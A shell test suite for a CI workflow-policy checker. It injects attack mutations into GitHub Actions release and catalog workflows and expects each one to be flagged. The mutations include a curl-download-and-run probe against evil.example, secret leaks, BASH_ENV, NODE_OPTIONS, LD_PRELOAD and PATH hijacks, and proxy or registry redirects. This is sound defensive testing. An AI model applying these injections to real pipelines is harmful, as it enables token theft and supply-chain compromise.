	$'GH_TOKEN from its step env.\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n' \
	$'GH_TOKEN from its step env.\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n' \
	'publish: checkout leaves the write token in .git/config'
expect_caught 'a job reading a PAT, with a read-only GITHUB_TOKEN, installing dependencies' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'    permissions:\n      contents: read\n      # The held-verified-bumps tracking issue.\n      issues: write\n    steps:\n' \
	$'    permissions:\n      contents: read\n    steps:\n      - run: bun install --frozen-lockfile\n' \
	'installs dependencies in a job holding a secret other than GITHUB_TOKEN'
expect_caught 'a PAT in workflow-level env, reaching the jobs that install' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'env:\n  # Pinned, matching test.yml' $'env:\n  LEAK: ${{ secrets.RELEASE_PR_TOKEN }}\n  # Pinned, matching test.yml' \
	'inspect: step 2: installs dependencies in a job holding a secret other than GITHUB_TOKEN'
expect_caught 'the catalog tests run from the write job, on the generated files' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Update or close the review issue' $'      - run: bun test src/workflows/pieces-library/catalog.test.ts\n      - name: Update or close the review issue' \
	'runs JavaScript in a job holding'
expect_caught 'node run from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Update or close the review issue' $'      - run: cd src && node -e 1\n      - name: Update or close the review issue' \
	'runs JavaScript in a job holding'
expect_caught 'the PAT handed to a later step' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          HELD_COUNT:' '          GH_TOKEN: ${{ secrets.RELEASE_PR_TOKEN }}
          HELD_COUNT:' \
	'secrets.RELEASE_PR_TOKEN is read 3 times'
expect_caught 'a refusal whose exit 1 is only a comment' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'on this repository."\n            exit 1\n' $'on this repository."\n            : # exit 1 later\n' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'bun as the step shell in the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Update or close the review issue' $'      - shell: bun {0}\n        run: console.log(1)\n      - name: Update or close the review issue' \
	'runs JavaScript (as its shell)'
expect_caught 'github-script in the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Update or close the review issue' $'      - uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b\n        with:\n          script: return 1\n      - name: Update or close the review issue' \
	'runs JavaScript (github-script)'
expect_caught 'node by absolute path in the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Update or close the review issue' $'      - run: /usr/bin/node -e 1\n      - name: Update or close the review issue' \
	'runs JavaScript in a job holding'
expect_caught 'a TypeScript file run by its shebang in the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Update or close the review issue' $'      - run: ./scripts/render-review-issue.ts x\n      - name: Update or close the review issue' \
	'runs JavaScript in a job holding'
expect_caught 'the PAT read by bracket in a later step' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          HELD_COUNT:' $'          GH_TOKEN: ${{ secrets[\'RELEASE_PR_TOKEN\'] }}\n          HELD_COUNT:' \
	'secrets.RELEASE_PR_TOKEN is read 3 times'
expect_caught 'the whole secrets context handed to a step' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          HELD_COUNT:' '          GH_TOKEN: ${{ toJSON(secrets) }}
          HELD_COUNT:' \
	'the whole secrets context is read somewhere'
expect_caught 'a refusal whose exit 1 is in a later, unrelated if' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'on this repository."\n            exit 1\n          fi\n' $'on this repository."\n          fi\n          if false; then exit 1; fi\n' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'the catalog PR opened with GITHUB_TOKEN (#935)' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          token: ${{ secrets.RELEASE_PR_TOKEN }}' '          token: ${{ secrets.GITHUB_TOKEN }}' \
	'publish: step Open PR with catalog changes: token is'
expect_caught 'the catalog PR opened with the default token (#935)' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n' '' \
	'token is "the default github.token"'
expect_caught 'the catalog PR falling back to GITHUB_TOKEN (#935)' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          token: ${{ secrets.RELEASE_PR_TOKEN }}' '          token: ${{ secrets.RELEASE_PR_TOKEN || secrets.GITHUB_TOKEN }}' \
	'not secrets.RELEASE_PR_TOKEN alone'
expect_caught 'the catalog branch pushed with another token (#935)' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          token: ${{ secrets.RELEASE_PR_TOKEN }}' $'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n          branch-token: ${{ github.token }}' \
	'branch-token is'
expect_caught 'the catalog PR with no refusal when its token is missing' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          if [ -z "$CATALOG_PR_TOKEN" ]; then' '          if false; then' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a refusal that only warns' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'on this repository."\n            exit 1\n' $'on this repository."\n' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a refusal under another condition than the PR step' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'      - name: Refuse without the catalog PR token\n        if: needs.generate.outputs.has_changes == \'true\'\n' \
	$'      - name: Refuse without the catalog PR token\n        if: needs.generate.outputs.held_count != \'0\'\n' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a refusal that cannot fail its step' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'      - name: Refuse without the catalog PR token\n' $'      - name: Refuse without the catalog PR token\n        continue-on-error: true\n' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a refusal in a job that cannot fail' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'    timeout-minutes: 15\n    # GITHUB_TOKEN only reads' $'    timeout-minutes: 15\n    continue-on-error: true\n    # GITHUB_TOKEN only reads' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a refusal whose exit 1 is outside its test' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'on this repository."\n            exit 1\n          fi\n' $'on this repository."\n          fi\n          true || exit 1\n' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a refusal that tests GITHUB_TOKEN instead' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'          CATALOG_PR_TOKEN: ${{ secrets.RELEASE_PR_TOKEN }}' '          CATALOG_PR_TOKEN: ${{ secrets.GITHUB_TOKEN }}' \
	'no earlier step refuses when RELEASE_PR_TOKEN is empty'
expect_caught 'a PR opened before the refusal runs' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Refuse without the catalog PR token' $'      - name: Open early\n        uses: peter-evans/create-pull-request@5f6978faf089d4d20b00c7766989d076bb2fc7f1 # v8.1.1\n        with:\n          token: ${{ secrets.RELEASE_PR_TOKEN }}\n      - name: Refuse without the catalog PR token' \
	'publish: step Open early: no earlier step refuses when RELEASE_PR_TOKEN is empty'

echo
echo "no env in a job holding id-token names code to run first, and no step writes env for the next (#999)"
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	expect_caught 'BASH_ENV in the brain publish job env (#999)' narrow "$WORKFLOWS/release-exec.yml" \
		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    env:\n      BASH_ENV: /tmp/x\n' \
		'publish-brain: job env sets BASH_ENV in a job holding id-token'
	expect_caught 'ENV in the sidecar workflow env (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'  NPM_VERSION: "12.1.0"\n' $'  NPM_VERSION: "12.1.0"\n  ENV: /tmp/x\n' \
		'publish-sidecar: workflow env sets ENV in a job holding id-token'
	expect_caught 'PATH in the sidecar publish step env (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          PATH: /tmp/evil:/usr/bin:/bin\n        run: |' \
		'publish-sidecar: step Ensure npm supports Trusted Publishing env sets PATH in a job holding id-token'
	expect_caught 'NODE_OPTIONS in the brain publish step env (#999)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          NODE_OPTIONS: --require /tmp/x.js\n        run: |' \
		'publish-brain: step Ensure npm supports Trusted Publishing env sets NODE_OPTIONS in a job holding id-token'
	expect_caught 'node_options in another case (#999)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Publish to npm\n        env:\n' $'      - name: Publish to npm\n        env:\n          node_options: --require /tmp/x.js\n' \
		'publish-brain: step Publish to npm env sets node_options in a job holding id-token'
	expect_caught 'LD_PRELOAD in the Windows signer job env, which publishes nothing (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'  sign-sidecar-windows:\n    needs: [resolve, build-sidecar-windows]\n' $'  sign-sidecar-windows:\n    needs: [resolve, build-sidecar-windows]\n    env:\n      LD_PRELOAD: /tmp/x.so\n' \
		'sign-sidecar-windows: job env sets LD_PRELOAD in a job holding id-token'
	expect_caught 'PATH in the installer signer job env (#999)' narrow "$WORKFLOWS/installer-release.yml" \
		$'  sign-windows:\n    needs: [resolve, build-windows]\n' $'  sign-windows:\n    needs: [resolve, build-windows]\n    env:\n      PATH: /tmp/evil:/usr/bin:/bin\n' \
		'sign-windows: job env sets PATH in a job holding id-token'
	expect_caught 'an exported bash function over npm (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          BASH_FUNC_npm%%: "() { echo x; }"\n        run: |' \
		'publish-sidecar: step Ensure npm supports Trusted Publishing env sets BASH_FUNC_npm%% in a job holding id-token'
	expect_caught 'xtrace turned on through SHELLOPTS, with PS4 to expand (#999)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Publish to npm\n        env:\n' $'      - name: Publish to npm\n        env:\n          SHELLOPTS: xtrace\n          PS4: $(id)\n' \
		'publish-brain: step Publish to npm env sets SHELLOPTS in a job holding id-token'
	expect_caught 'PS4 on its own (#999)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Publish to npm\n        env:\n' $'      - name: Publish to npm\n        env:\n          PS4: $(id)\n' \
		'publish-brain: step Publish to npm env sets PS4 in a job holding id-token'
	expect_caught 'set-env and add-path commands allowed again (#999)' narrow "$WORKFLOWS/release-exec.yml" \
		$'  NPM_VERSION: "12.1.0"\n' $'  NPM_VERSION: "12.1.0"\n  ACTIONS_ALLOW_UNSECURE_COMMANDS: "true"\n' \
		'publish-brain: workflow env sets ACTIONS_ALLOW_UNSECURE_COMMANDS in a job holding id-token'
	expect_caught 'NODE_OPTIONS in a job container env (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    container:\n      image: x\n      env:\n        NODE_OPTIONS: --require /tmp/x.js\n    # Same requirement' \
		'publish-sidecar: container env sets NODE_OPTIONS in a job holding id-token'
	expect_caught 'a job env given as an expression, which the rule cannot read (#999)' narrow "$WORKFLOWS/release-exec.yml" \
		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    env: ${{ fromJSON(vars.PUBLISH_ENV) }}\n' \
		'publish-brain: job env is "${{ fromJSON(vars.PUBLISH_ENV) }}", not a mapping this rule can read'
	expect_caught 'a step env given as an expression (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env: ${{ fromJSON(vars.PUBLISH_ENV) }}\n        run: |' \
		'publish-sidecar: step Ensure npm supports Trusted Publishing env is "${{ fromJSON(vars.PUBLISH_ENV) }}", not a mapping'
	expect_caught 'BASH_ENV set for later steps through GITHUB_ENV (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'            VERSION="${GIVEN_VERSION:-}"\n' $'            VERSION="${GIVEN_VERSION:-}"\n            echo "BASH_ENV=/tmp/x" >> "$GITHUB_ENV"\n' \
		'publish-sidecar: step Resolve the version this call publishes writes GITHUB_ENV or GITHUB_PATH'
	expect_caught 'a directory put ahead of npm through GITHUB_PATH (#999)' narrow "$WORKFLOWS/release-exec.yml" \
		'          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::pack-brain reported no digest"; exit 1; }' $'          echo /tmp/evil >> "${GITHUB_PATH}"\n          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::pack-brain reported no digest"; exit 1; }' \
		'publish-brain: step Verify the tarball writes GITHUB_ENV or GITHUB_PATH'
	expect_caught 'the runner env file written by its path (#999)' narrow "$WORKFLOWS/installer-release.yml" \
		$'      # For scripts/sign-windows.sh and the committed certificate chain.\n' $'      - run: cat x >> "$RUNNER_TEMP"/_runner_file_commands/set_env_1\n      # For scripts/sign-windows.sh and the committed certificate chain.\n' \
		'sign-windows: step 0 writes GITHUB_ENV or GITHUB_PATH'
	expect_caught 'a default shell that sets BASH_ENV, in a job that publishes nothing (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'  sign-sidecar-windows:\n    needs: [resolve, build-sidecar-windows]\n' $'  sign-sidecar-windows:\n    needs: [resolve, build-sidecar-windows]\n    defaults:\n      run:\n        shell: env BASH_ENV=/tmp/x bash -e {0}\n' \
		'sign-sidecar-windows: step Verify the binary runs in shell: env BASH_ENV=/tmp/x bash -e {0} in a job holding id-token'
	expect_caught 'a proxy for the npm publish (#999 security review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Publish to npm\n        env:\n' $'      - name: Publish to npm\n        env:\n          HTTPS_PROXY: http://proxy.evil.example:3128\n' \
		'publish-brain: step Publish to npm env sets HTTPS_PROXY in a job holding id-token'
	expect_caught 'an extra CA node trusts, for that proxy (#999 security review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'  NPM_VERSION: "12.1.0"\n' $'  NPM_VERSION: "12.1.0"\n  NODE_EXTRA_CA_CERTS: /tmp/evil-ca.pem\n' \
		'publish-sidecar: workflow env sets NODE_EXTRA_CA_CERTS in a job holding id-token'
	expect_caught 'HOME moved, so npm reads another .npmrc (#999 security review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    env:\n      HOME: /tmp/evil-home\n' \
		'publish-brain: job env sets HOME in a job holding id-token'
	expect_caught 'GITHUB_ENV set as an env name (#999 security review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Publish to npm\n        env:\n' $'      - name: Publish to npm\n        env:\n          GITHUB_ENV: /tmp/evil-env\n' \
		'publish-brain: step Publish to npm env sets GITHUB_ENV in a job holding id-token'
	expect_caught 'the id-token request URL set as an env name (#999 security review)' narrow "$WORKFLOWS/installer-release.yml" \
		$'  sign-windows:\n    needs: [resolve, build-windows]\n' $'  sign-windows:\n    needs: [resolve, build-windows]\n    env:\n      ACTIONS_ID_TOKEN_REQUEST_URL: https://evil.example/\n' \
		'sign-windows: job env sets ACTIONS_ID_TOKEN_REQUEST_URL in a job holding id-token'
	expect_caught 'a name no job holding id-token uses yet (#999 security review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          SOMETHING_NEW: x\n        run: |' \
		'publish-sidecar: step Ensure npm supports Trusted Publishing env sets SOMETHING_NEW, a name no job holding id-token uses yet'
	expect_caught 'a container whose options set env (#999 security review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    container:\n      image: node:22\n      options: --env NODE_OPTIONS=--require=/tmp/x.js\n' \
		'publish-brain: runs in a container: in a job holding id-token'
	expect_caught 'a service container beside the signer (#999 security review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'  sign-sidecar-windows:\n    needs: [resolve, build-sidecar-windows]\n' $'  sign-sidecar-windows:\n    needs: [resolve, build-sidecar-windows]\n    services:\n      x:\n        image: evil\n' \
		'sign-sidecar-windows: runs services: in a job holding id-token'
	expect_caught 'a proxy exported in the publish script (#999 security review)' narrow "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          export HTTPS_PROXY=http://proxy.evil.example:3128\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
		'publish-brain: step Publish to npm sets HTTPS_PROXY in its script, in a job holding id-token'
	expect_caught 'NODE_OPTIONS in front of the publish command (#999 security review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'            npm publish --access public --ignore-scripts "${flags[@]}" 2>&1 | tee "$err"' '            NODE_OPTIONS=--require=/tmp/x.js npm publish --access public --ignore-scripts "${flags[@]}" 2>&1 | tee "$err"' \
		'publish-sidecar: step Publish platform packages sets NODE_OPTIONS in its script, in a job holding id-token'
	expect_caught 'a relative TMPDIR for the npm publish job (#1000 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    env:\n      TMPDIR: git+https:/evil.example/r\n    # Same requirement' \
		'publish-sidecar: job env sets TMPDIR in a job holding id-token'
	expect_caught 'an OpenSSL config that loads a module (#1000 review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          OPENSSL_CONF: /tmp/evil.cnf\n        run: |' \
		'publish-brain: step Ensure npm supports Trusted Publishing env sets OPENSSL_CONF in a job holding id-token'
}

echo
echo "no env in the job that installs npm and packs the brain tarball names code to run first either (#1030)"
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	expect_caught 'BASH_ENV in the pack-brain job env (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
		$'    needs: [validate-tag, test, smoke-image]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, test, smoke-image]\n    runs-on: ubuntu-latest\n    env:\n      BASH_ENV: /tmp/x\n' \
		'pack-brain: job env sets BASH_ENV in a job that installs npm from its checked tarball or runs npm pack (#1030)'
	expect_caught 'an earlier pack-brain step writing NODE_OPTIONS to GITHUB_ENV (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Install the pinned npm' $'      - run: echo "NODE_OPTIONS=--require /tmp/x.js" >> "$GITHUB_ENV"\n      - name: Install the pinned npm' \
		'pack-brain: step 3 writes GITHUB_ENV or GITHUB_PATH (env for every later step) in a job that installs npm from its checked tarball or runs npm pack (#1030)'
	expect_caught 'PATH in the env of the pack step (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Pack\n        id: pack\n' $'      - name: Pack\n        id: pack\n        env:\n          PATH: /tmp/evil:/usr/bin:/bin\n' \
		'pack-brain: step Pack env sets PATH in a job that installs npm from its checked tarball or runs npm pack (#1030)'
	expect_caught 'npm pointed at another registry for the pack, a name no such job uses (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Pack\n        id: pack\n' $'      - name: Pack\n        id: pack\n        env:\n          npm_config_registry: https://registry.evil.example/\n' \
		'pack-brain: step Pack env sets npm_config_registry, a name no job holding id-token uses yet'
	expect_caught 'a shell that sets BASH_ENV for the pack step (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Pack\n        id: pack\n' $'      - name: Pack\n        id: pack\n        shell: env BASH_ENV=/tmp/x bash -e {0}\n' \
		'pack-brain: step Pack runs in shell: env BASH_ENV=/tmp/x bash -e {0} in a job that installs npm from its checked tarball or runs npm pack (#1030)'
	expect_caught 'NODE_OPTIONS exported in the pack script (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
		'          dir="$RUNNER_TEMP/brain-pack"' $'          export NODE_OPTIONS=--require=/tmp/x.js\n          dir="$RUNNER_TEMP/brain-pack"' \
		'pack-brain: step Pack sets NODE_OPTIONS in its script, in a job that installs npm from its checked tarball or runs npm pack (#1030)'
	expect_caught 'a job of another name that only packs, with BASH_ENV (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      BASH_ENV: /tmp/x\n    steps:\n      - run: npm pack\n' \
		'sneak: job env sets BASH_ENV in a job that installs npm from its checked tarball or runs npm pack (#1030)'
	expect_caught 'a pack with an option value before the verb, with BASH_ENV (review of #1030)' narrow "$WORKFLOWS/release-exec.yml" \
		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      BASH_ENV: /tmp/x\n    steps:\n      - run: npm --loglevel silent pack\n' \
		'sneak: job env sets BASH_ENV in a job that installs npm from its checked tarball or runs npm pack (#1030)'
	expect_caught 'a pack with npm quoted, with BASH_ENV (security review of #1030)' narrow "$WORKFLOWS/release-exec.yml" \
		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      BASH_ENV: /tmp/x\n    steps:\n      - run: \x27"npm" pack\x27\n' \
		'sneak: job env sets BASH_ENV in a job that installs npm from its checked tarball or runs npm pack (#1030)'
	expect_caught 'a pack by bun pm pack, with BASH_ENV (security review of #1030)' narrow "$WORKFLOWS/release-exec.yml" \
		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      BASH_ENV: /tmp/x\n    steps:\n      - run: bun pm pack\n' \
		'sneak: job env sets BASH_ENV in a job that installs npm from its checked tarball or runs npm pack (#1030)'
	expect_caught 'a pack split across a continuation line, with BASH_ENV (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      BASH_ENV: /tmp/x\n    steps:\n      - run: |\n          npm \\\n            pack\n' \
		'sneak: job env sets BASH_ENV in a job that installs npm from its checked tarball or runs npm pack (#1030)'
}

echo
echo "the npm publishing jobs, every job holding id-token, and the macOS signers run only the commands listed for them (#1029, #870)"
for f in "$WORKFLOWS"/*.yml; do
	expect_clean "$(basename "$f"): every job holding id-token runs only its listed commands" runs "$f"
done
# Both jobs were read, or the list matched nothing and passed for that.
for spec in "release-exec.yml publish-brain" "sidecar-release.yml publish-sidecar" "sidecar-release.yml sign-sidecar-windows" "installer-release.yml sign-windows" "sidecar-release.yml sign-sidecar-darwin" "installer-release.yml sign-macos"; do
	read -r f j <<<"$spec"
	if RUNS_REPORT=1 check runs "$WORKFLOWS/$f" | grep -qxF "checked $j"; then
		ok "the run allowlist read ${j} in ${f} (#1029)"
	else
		no "the run allowlist read ${j} in ${f} (#1029)"
	fi
done
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	# The probe from the issue, one reason at a time.
	probe=$'      - run: curl -o /tmp/x https://evil.example/x; chmod +x /tmp/x; /tmp/x\n      - name: Publish to npm'
	expect_caught 'a downloaded file run by its path in the brain publish job (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'      - name: Publish to npm' "$probe" \
		'publish-brain: step 4 runs /tmp/x, which is not a plain command name this rule can check'
	expect_caught 'chmod in the brain publish job, which it never ran (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'      - name: Publish to npm' "$probe" \
		'publish-brain: step 4 runs chmod, which is not on the publish-brain list'
	expect_caught 'a download that is not the pinned npm tarball (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'      - name: Publish to npm' "$probe" \
		'publish-brain: step 4 runs "curl -o /tmp/x https://evil.example/x", which is not one of the forms listed for curl'
	# Without the pin on curl, the same attack needs no new command name.
	expect_caught 'the pinned download pointed at the npm on PATH (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          curl -fsS --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 67108864 -o /usr/local/bin/npm "https://registry.npmjs.org/npm/-/npm-${NPM_VERSION}.tgz"\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
		'not one of the forms listed for curl'
	expect_caught 'a shell run on the download (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          bash /tmp/x\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
		'publish-brain: step Publish to npm runs bash, which is not on the publish-brain list'
	expect_caught 'a command inside a substitution (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          x="$(sh -c id)"\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
		'publish-brain: step Publish to npm runs sh, which is not on the publish-brain list'
	expect_caught 'a command inside a [[ ]] (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          [[ -n "$(sh -c id)" ]] || exit 1\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
		'publish-brain: step Publish to npm runs sh, which is not on the publish-brain list'
	expect_caught 'a command after an ANSI-C quote that looks unclosed (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo $\x27\\\x27\x27; sh -c id #\x27\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
		'publish-brain: step Publish to npm runs sh, which is not on the publish-brain list'
	expect_caught 'a command inside an array subscript (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo "${flags[$(sh -c id)]}"\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
		'publish-brain: step Publish to npm runs sh, which is not on the publish-brain list'
	expect_caught 'eval in the brain publish job (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          eval "$x"\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
		'publish-brain: step Publish to npm runs eval, which is not on the publish-brain list'
	expect_caught 'the digest check neutered by a function of the same name (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          echo "${SHA256}  ${RUNNER_TEMP}/brain-pack/${TARBALL}" | sha256sum -c -' $'          sha256sum() { :; }\n          echo "${SHA256}  ${RUNNER_TEMP}/brain-pack/${TARBALL}" | sha256sum -c -' \
		'publish-brain: step Verify the tarball defines a function sha256sum over a command'
	expect_caught 'a function not on the list (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          echo "${SHA256}  ${RUNNER_TEMP}/brain-pack/${TARBALL}" | sha256sum -c -' $'          f() { echo x; }\n          echo "${SHA256}  ${RUNNER_TEMP}/brain-pack/${TARBALL}" | sha256sum -c -' \
		'publish-brain: step Verify the tarball defines a function f, which is not on the publish-brain list'
	expect_caught 'a file written over by a redirection (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo x > /usr/local/bin/npm\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
		'publish-brain: step Publish to npm writes to /usr/local/bin/npm'
	expect_caught 'a file written over by >& (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo x >&/usr/local/bin/npm\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
		'publish-brain: step Publish to npm writes to /usr/local/bin/npm'
	expect_caught 'another registry slipped into the npm flags (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi\n          flags+=(--registry=https://registry.evil.example/)' \
		'publish-brain: step Publish to npm sets the array flags=(--registry=https://registry.evil.example/), which is not on the publish-brain list'
	expect_caught 'another registry in front of the publish (#1029)' runs "$WORKFLOWS/release-exec.yml" \
		'          if ! npm publish "${RUNNER_TEMP}' '          if ! npm_config_registry=https://registry.evil.example/ npm publish "${RUNNER_TEMP}' \
		'publish-brain: step Publish to npm runs npm with npm_config_registry=https://registry.evil.example/ in front'
